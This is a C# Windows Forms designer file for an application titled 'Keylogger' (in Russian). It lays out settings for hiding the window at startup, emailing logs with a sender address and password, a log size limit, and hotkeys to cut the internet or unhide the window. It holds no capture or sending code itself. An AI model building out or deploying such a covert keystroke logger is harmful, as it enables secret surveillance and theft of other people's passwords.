namespace GlobalHooks.View
{
    partial class MainWindow
    {
        /// <summary>
        /// Обязательная переменная конструктора.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Освободить все используемые ресурсы.
        /// </summary>
        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// <summary>
        /// Требуемый метод для поддержки конструктора — не изменяйте 
        /// содержимое этого метода с помощью редактора кода.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainWindow));
            this.btSettings = new System.Windows.Forms.Button();
            this.btHide = new System.Windows.Forms.Button();
            this.gbSettings = new System.Windows.Forms.GroupBox();
            this.numUDFileSize = new System.Windows.Forms.NumericUpDown();
            this.lbLogFileSize = new System.Windows.Forms.Label();
            this.tbEmail = new System.Windows.Forms.TextBox();
            this.lbEmail = new System.Windows.Forms.Label();
            this.cbHide = new System.Windows.Forms.CheckBox();
            this.lbHide = new System.Windows.Forms.Label();
            this.btAbort = new System.Windows.Forms.Button();
            this.btSave = new System.Windows.Forms.Button();
            this.gbAdvansedSettings = new System.Windows.Forms.GroupBox();
            this.cbShow3 = new System.Windows.Forms.ComboBox();
            this.cbShow2 = new System.Windows.Forms.ComboBox();
            this.cbShow1 = new System.Windows.Forms.ComboBox();
            this.cbSettings4 = new System.Windows.Forms.ComboBox();
            this.cbSettings3 = new System.Windows.Forms.ComboBox();
            this.cbSettings2 = new System.Windows.Forms.ComboBox();
            this.cbSettings1 = new System.Windows.Forms.ComboBox();
            this.cbDisconnect2 = new System.Windows.Forms.ComboBox();
            this.cbDisconnect1 = new System.Windows.Forms.ComboBox();
            this.lbShowAdvansedSettings = new System.Windows.Forms.Label();
            this.lbShow = new System.Windows.Forms.Label();
            this.tbFrom = new System.Windows.Forms.TextBox();
            this.lbDisconnect = new System.Windows.Forms.Label();
            this.tbPassword = new System.Windows.Forms.TextBox();
            this.lbPassword = new System.Windows.Forms.Label();
            this.lbFrom = new System.Windows.Forms.Label();
            this.btAbortAdvansedSettings = new System.Windows.Forms.Button();
            this.btSaveAdvansedSettings = new System.Windows.Forms.Button();
            this.gbSettings.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numUDFileSize)).BeginInit();
            this.gbAdvansedSettings.SuspendLayout();
            this.SuspendLayout();
            // 
            // btSettings
            // 
            this.btSettings.BackColor = System.Drawing.Color.LavenderBlush;
            this.btSettings.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btSettings.Location = new System.Drawing.Point(93, 136);
            this.btSettings.Name = "btSettings";
            this.btSettings.Size = new System.Drawing.Size(163, 63);
            this.btSettings.TabIndex = 0;
            this.btSettings.Text = "Настройки";
            this.btSettings.UseVisualStyleBackColor = false;
            this.btSettings.Click += new System.EventHandler(this.btSettings_Click);
            // 
            // btHide
            // 
            this.btHide.BackColor = System.Drawing.Color.LavenderBlush;
            this.btHide.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btHide.Location = new System.Drawing.Point(384, 136);
            this.btHide.Name = "btHide";
            this.btHide.Size = new System.Drawing.Size(163, 63);
            this.btHide.TabIndex = 1;
            this.btHide.Text = "Скрыть";
            this.btHide.UseVisualStyleBackColor = false;
            this.btHide.Click += new System.EventHandler(this.btHide_Click);
            // 
            // gbSettings
            // 
            this.gbSettings.Controls.Add(this.numUDFileSize);
            this.gbSettings.Controls.Add(this.lbLogFileSize);
            this.gbSettings.Controls.Add(this.tbEmail);
            this.gbSettings.Controls.Add(this.lbEmail);
            this.gbSettings.Controls.Add(this.cbHide);
            this.gbSettings.Controls.Add(this.lbHide);
            this.gbSettings.Controls.Add(this.btAbort);
            this.gbSettings.Controls.Add(this.btSave);
            this.gbSettings.Location = new System.Drawing.Point(13, 13);
            this.gbSettings.Name = "gbSettings";
            this.gbSettings.Size = new System.Drawing.Size(634, 311);
            this.gbSettings.TabIndex = 2;
            this.gbSettings.TabStop = false;
            this.gbSettings.Text = "Настройки";
            this.gbSettings.Visible = false;
            // 
            // numUDFileSize
            // 
            this.numUDFileSize.BackColor = System.Drawing.Color.LavenderBlush;
            this.numUDFileSize.Location = new System.Drawing.Point(382, 131);
            this.numUDFileSize.Maximum = new decimal(new int[] {
            10000,
            0,
            0,
            0});
            this.numUDFileSize.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.numUDFileSize.Name = "numUDFileSize";
            this.numUDFileSize.Size = new System.Drawing.Size(111, 33);
            this.numUDFileSize.TabIndex = 7;
            this.numUDFileSize.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.numUDFileSize.Value = new decimal(new int[] {
            1,
            0,
            0,
            0});
            // 
            // lbLogFileSize
            // 
            this.lbLogFileSize.AutoSize = true;
            this.lbLogFileSize.Location = new System.Drawing.Point(25, 133);
            this.lbLogFileSize.Name = "lbLogFileSize";
            this.lbLogFileSize.Size = new System.Drawing.Size(262, 27);
            this.lbLogFileSize.TabIndex = 6;
            this.lbLogFileSize.Text = "Размер файла (байт):";
            // 
            // tbEmail
            // 
            this.tbEmail.BackColor = System.Drawing.Color.LavenderBlush;
            this.tbEmail.Location = new System.Drawing.Point(382, 92);
            this.tbEmail.Name = "tbEmail";
            this.tbEmail.Size = new System.Drawing.Size(231, 33);
            this.tbEmail.TabIndex = 5;
            // 
            // lbEmail
            // 
            this.lbEmail.AutoSize = true;
            this.lbEmail.Location = new System.Drawing.Point(25, 95);
            this.lbEmail.Name = "lbEmail";
            this.lbEmail.Size = new System.Drawing.Size(351, 27);
            this.lbEmail.TabIndex = 4;
            this.lbEmail.Text = "Email, куда отправлять логи:";
            // 
            // cbHide
            // 
            this.cbHide.AutoSize = true;
            this.cbHide.Location = new System.Drawing.Point(382, 61);
            this.cbHide.Name = "cbHide";
            this.cbHide.Size = new System.Drawing.Size(18, 17);
            this.cbHide.TabIndex = 3;
            this.cbHide.UseVisualStyleBackColor = true;
            // 
            // lbHide
            // 
            this.lbHide.AutoSize = true;
            this.lbHide.Location = new System.Drawing.Point(25, 55);
            this.lbHide.Name = "lbHide";
            this.lbHide.Size = new System.Drawing.Size(304, 27);
            this.lbHide.TabIndex = 2;
            this.lbHide.Text = "Скрыть окно при запуске";
            // 
            // btAbort
            // 
            this.btAbort.BackColor = System.Drawing.Color.LavenderBlush;
            this.btAbort.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btAbort.Location = new System.Drawing.Point(371, 255);
            this.btAbort.Name = "btAbort";
            this.btAbort.Size = new System.Drawing.Size(163, 39);
            this.btAbort.TabIndex = 1;
            this.btAbort.Text = "Отмена";
            this.btAbort.UseVisualStyleBackColor = false;
            this.btAbort.Click += new System.EventHandler(this.btAbort_Click);
            // 
            // btSave
            // 
            this.btSave.BackColor = System.Drawing.Color.LavenderBlush;
            this.btSave.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btSave.Location = new System.Drawing.Point(80, 255);
            this.btSave.Name = "btSave";
            this.btSave.Size = new System.Drawing.Size(163, 39);
            this.btSave.TabIndex = 0;
            this.btSave.Text = "Сохранить";
            this.btSave.UseVisualStyleBackColor = false;
            this.btSave.Click += new System.EventHandler(this.btSave_Click);
            // 
            // gbAdvansedSettings
            // 
            this.gbAdvansedSettings.Controls.Add(this.cbShow3);
            this.gbAdvansedSettings.Controls.Add(this.cbShow2);
            this.gbAdvansedSettings.Controls.Add(this.cbShow1);
            this.gbAdvansedSettings.Controls.Add(this.cbSettings4);
            this.gbAdvansedSettings.Controls.Add(this.cbSettings3);
            this.gbAdvansedSettings.Controls.Add(this.cbSettings2);
            this.gbAdvansedSettings.Controls.Add(this.cbSettings1);
            this.gbAdvansedSettings.Controls.Add(this.cbDisconnect2);
            this.gbAdvansedSettings.Controls.Add(this.cbDisconnect1);
            this.gbAdvansedSettings.Controls.Add(this.lbShowAdvansedSettings);
            this.gbAdvansedSettings.Controls.Add(this.lbShow);
            this.gbAdvansedSettings.Controls.Add(this.tbFrom);
            this.gbAdvansedSettings.Controls.Add(this.lbDisconnect);
            this.gbAdvansedSettings.Controls.Add(this.tbPassword);
            this.gbAdvansedSettings.Controls.Add(this.lbPassword);
            this.gbAdvansedSettings.Controls.Add(this.lbFrom);
            this.gbAdvansedSettings.Controls.Add(this.btAbortAdvansedSettings);
            this.gbAdvansedSettings.Controls.Add(this.btSaveAdvansedSettings);
            this.gbAdvansedSettings.Location = new System.Drawing.Point(12, 13);
            this.gbAdvansedSettings.Name = "gbAdvansedSettings";
            this.gbAdvansedSettings.Size = new System.Drawing.Size(634, 311);
            this.gbAdvansedSettings.TabIndex = 8;
            this.gbAdvansedSettings.TabStop = false;
            this.gbAdvansedSettings.Text = "Настройки++";
            this.gbAdvansedSettings.Visible = false;
            // 
            // cbShow3
            // 
            this.cbShow3.BackColor = System.Drawing.Color.LavenderBlush;
            this.cbShow3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbShow3.FormattingEnabled = true;
            this.cbShow3.Location = new System.Drawing.Point(484, 172);
            this.cbShow3.Name = "cbShow3";
            this.cbShow3.Size = new System.Drawing.Size(95, 34);
            this.cbShow3.TabIndex = 19;
            // 
            // cbShow2
            // 
            this.cbShow2.BackColor = System.Drawing.Color.LavenderBlush;
            this.cbShow2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbShow2.FormattingEnabled = true;
            this.cbShow2.Location = new System.Drawing.Point(383, 172);
            this.cbShow2.Name = "cbShow2";
            this.cbShow2.Size = new System.Drawing.Size(95, 34);
            this.cbShow2.TabIndex = 18;
            this.cbShow2.SelectionChangeCommitted += new System.EventHandler(this.cbShow2_SelectionChangeCommitted);
            // 
            // cbShow1
            // 
            this.cbShow1.BackColor = System.Drawing.Color.LavenderBlush;
            this.cbShow1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbShow1.FormattingEnabled = true;
            this.cbShow1.Location = new System.Drawing.Point(282, 172);
            this.cbShow1.Name = "cbShow1";
            this.cbShow1.Size = new System.Drawing.Size(95, 34);
            this.cbShow1.TabIndex = 17;
            this.cbShow1.SelectionChangeCommitted += new System.EventHandler(this.cbShow1_SelectionChangeCommitted);
            // 
            // cbSettings4
            // 
            this.cbSettings4.BackColor = System.Drawing.Color.LavenderBlush;
            this.cbSettings4.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbSettings4.FormattingEnabled = true;
            this.cbSettings4.Location = new System.Drawing.Point(541, 212);
            this.cbSettings4.Name = "cbSettings4";
            this.cbSettings4.Size = new System.Drawing.Size(80, 34);
            this.cbSettings4.TabIndex = 16;
            // 
            // cbSettings3
            // 
            this.cbSettings3.BackColor = System.Drawing.Color.LavenderBlush;
            this.cbSettings3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbSettings3.FormattingEnabled = true;
            this.cbSettings3.Location = new System.Drawing.Point(455, 212);
            this.cbSettings3.Name = "cbSettings3";
            this.cbSettings3.Size = new System.Drawing.Size(80, 34);
            this.cbSettings3.TabIndex = 15;
            this.cbSettings3.SelectionChangeCommitted += new System.EventHandler(this.cbSettings3_SelectionChangeCommitted);
            // 
            // cbSettings2
            // 
            this.cbSettings2.BackColor = System.Drawing.Color.LavenderBlush;
            this.cbSettings2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbSettings2.FormattingEnabled = true;
            this.cbSettings2.Location = new System.Drawing.Point(368, 212);
            this.cbSettings2.Name = "cbSettings2";
            this.cbSettings2.Size = new System.Drawing.Size(80, 34);
            this.cbSettings2.TabIndex = 14;
            this.cbSettings2.SelectionChangeCommitted += new System.EventHandler(this.cbSettings2_SelectionChangeCommitted);
            // 
            // cbSettings1
            // 
            this.cbSettings1.BackColor = System.Drawing.Color.LavenderBlush;
            this.cbSettings1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbSettings1.FormattingEnabled = true;
            this.cbSettings1.Location = new System.Drawing.Point(282, 212);
            this.cbSettings1.Name = "cbSettings1";
            this.cbSettings1.Size = new System.Drawing.Size(80, 34);
            this.cbSettings1.TabIndex = 13;
            this.cbSettings1.SelectionChangeCommitted += new System.EventHandler(this.cbSettings1_SelectionChangeCommitted);
            // 
            // cbDisconnect2
            // 
            this.cbDisconnect2.BackColor = System.Drawing.Color.LavenderBlush;
            this.cbDisconnect2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbDisconnect2.FormattingEnabled = true;
            this.cbDisconnect2.Location = new System.Drawing.Point(398, 130);
            this.cbDisconnect2.Name = "cbDisconnect2";
            this.cbDisconnect2.Size = new System.Drawing.Size(110, 34);
            this.cbDisconnect2.TabIndex = 12;
            // 
            // cbDisconnect1
            // 
            this.cbDisconnect1.BackColor = System.Drawing.Color.LavenderBlush;
            this.cbDisconnect1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cbDisconnect1.FormattingEnabled = true;
            this.cbDisconnect1.Location = new System.Drawing.Point(282, 130);
            this.cbDisconnect1.Name = "cbDisconnect1";
            this.cbDisconnect1.Size = new System.Drawing.Size(110, 34);
            this.cbDisconnect1.TabIndex = 11;
            // 
            // lbShowAdvansedSettings
            // 
            this.lbShowAdvansedSettings.AutoSize = true;
            this.lbShowAdvansedSettings.Location = new System.Drawing.Point(7, 215);
            this.lbShowAdvansedSettings.Name = "lbShowAdvansedSettings";
            this.lbShowAdvansedSettings.Size = new System.Drawing.Size(176, 27);
            this.lbShowAdvansedSettings.TabIndex = 10;
            this.lbShowAdvansedSettings.Text = "Настройки++:";
            // 
            // lbShow
            // 
            this.lbShow.AutoSize = true;
            this.lbShow.Location = new System.Drawing.Point(7, 175);
            this.lbShow.Name = "lbShow";
            this.lbShow.Size = new System.Drawing.Size(197, 27);
            this.lbShow.TabIndex = 9;
            this.lbShow.Text = "Снять скрытие:";
            // 
            // tbFrom
            // 
            this.tbFrom.BackColor = System.Drawing.Color.LavenderBlush;
            this.tbFrom.Location = new System.Drawing.Point(282, 49);
            this.tbFrom.Name = "tbFrom";
            this.tbFrom.Size = new System.Drawing.Size(339, 33);
            this.tbFrom.TabIndex = 8;
            // 
            // lbDisconnect
            // 
            this.lbDisconnect.AutoSize = true;
            this.lbDisconnect.Location = new System.Drawing.Point(7, 133);
            this.lbDisconnect.Name = "lbDisconnect";
            this.lbDisconnect.Size = new System.Drawing.Size(275, 27);
            this.lbDisconnect.TabIndex = 6;
            this.lbDisconnect.Text = "Отключить интернет:";
            // 
            // tbPassword
            // 
            this.tbPassword.BackColor = System.Drawing.Color.LavenderBlush;
            this.tbPassword.Location = new System.Drawing.Point(282, 92);
            this.tbPassword.Name = "tbPassword";
            this.tbPassword.PasswordChar = '*';
            this.tbPassword.Size = new System.Drawing.Size(339, 33);
            this.tbPassword.TabIndex = 5;
            // 
            // lbPassword
            // 
            this.lbPassword.AutoSize = true;
            this.lbPassword.Location = new System.Drawing.Point(7, 95);
            this.lbPassword.Name = "lbPassword";
            this.lbPassword.Size = new System.Drawing.Size(99, 27);
            this.lbPassword.TabIndex = 4;
            this.lbPassword.Text = "Пароль:";
            // 
            // lbFrom
            // 
            this.lbFrom.AutoSize = true;
            this.lbFrom.Location = new System.Drawing.Point(7, 55);
            this.lbFrom.Name = "lbFrom";
            this.lbFrom.Size = new System.Drawing.Size(241, 27);
            this.lbFrom.TabIndex = 2;
            this.lbFrom.Text = "Email отправителя:";
            // 
            // btAbortAdvansedSettings
            // 
            this.btAbortAdvansedSettings.BackColor = System.Drawing.Color.LavenderBlush;
            this.btAbortAdvansedSettings.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btAbortAdvansedSettings.Location = new System.Drawing.Point(372, 266);
            this.btAbortAdvansedSettings.Name = "btAbortAdvansedSettings";
            this.btAbortAdvansedSettings.Size = new System.Drawing.Size(163, 39);
            this.btAbortAdvansedSettings.TabIndex = 1;
            this.btAbortAdvansedSettings.Text = "Отмена";
            this.btAbortAdvansedSettings.UseVisualStyleBackColor = false;
            this.btAbortAdvansedSettings.Click += new System.EventHandler(this.btAbortAdvansedSettings_Click);
            // 
            // btSaveAdvansedSettings
            // 
            this.btSaveAdvansedSettings.BackColor = System.Drawing.Color.LavenderBlush;
            this.btSaveAdvansedSettings.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btSaveAdvansedSettings.Location = new System.Drawing.Point(81, 266);
            this.btSaveAdvansedSettings.Name = "btSaveAdvansedSettings";
            this.btSaveAdvansedSettings.Size = new System.Drawing.Size(163, 39);
            this.btSaveAdvansedSettings.TabIndex = 0;
            this.btSaveAdvansedSettings.Text = "Сохранить";
            this.btSaveAdvansedSettings.UseVisualStyleBackColor = false;
            this.btSaveAdvansedSettings.Click += new System.EventHandler(this.btSaveAdvansedSettings_Click);
            // 
            // MainWindow
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(14F, 26F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Plum;
            this.ClientSize = new System.Drawing.Size(659, 336);
            this.Controls.Add(this.gbAdvansedSettings);
            this.Controls.Add(this.gbSettings);
            this.Controls.Add(this.btHide);
            this.Controls.Add(this.btSettings);
            this.Font = new System.Drawing.Font("PG Isadora Cyr Pro", 13.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(5);
            this.Name = "MainWindow";
            this.Text = "Кейлоггер";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MainWindow_FormClosing);
            this.Shown += new System.EventHandler(this.MainWindow_Shown);
            this.gbSettings.ResumeLayout(false);
            this.gbSettings.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numUDFileSize)).EndInit();
            this.gbAdvansedSettings.ResumeLayout(false);
            this.gbAdvansedSettings.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Button btSettings;
        private System.Windows.Forms.Button btHide;
        private System.Windows.Forms.GroupBox gbSettings;
        private System.Windows.Forms.Label lbHide;
        private System.Windows.Forms.Button btAbort;
        private System.Windows.Forms.Button btSave;
        private System.Windows.Forms.NumericUpDown numUDFileSize;
        private System.Windows.Forms.Label lbLogFileSize;
        private System.Windows.Forms.TextBox tbEmail;
        private System.Windows.Forms.Label lbEmail;
        private System.Windows.Forms.CheckBox cbHide;
        private System.Windows.Forms.GroupBox gbAdvansedSettings;
        private System.Windows.Forms.Label lbDisconnect;
        private System.Windows.Forms.TextBox tbPassword;
        private System.Windows.Forms.Label lbPassword;
        private System.Windows.Forms.Button btAbortAdvansedSettings;
        private System.Windows.Forms.Button btSaveAdvansedSettings;
        private System.Windows.Forms.TextBox tbFrom;
        private System.Windows.Forms.Label lbFrom;
        private System.Windows.Forms.Label lbShow;
        private System.Windows.Forms.Label lbShowAdvansedSettings;
        private System.Windows.Forms.ComboBox cbShow3;
        private System.Windows.Forms.ComboBox cbShow2;
        private System.Windows.Forms.ComboBox cbShow1;
        private System.Windows.Forms.ComboBox cbSettings4;
        private System.Windows.Forms.ComboBox cbSettings3;
        private System.Windows.Forms.ComboBox cbSettings2;
        private System.Windows.Forms.ComboBox cbSettings1;
        private System.Windows.Forms.ComboBox cbDisconnect2;
        private System.Windows.Forms.ComboBox cbDisconnect1;
    }
}

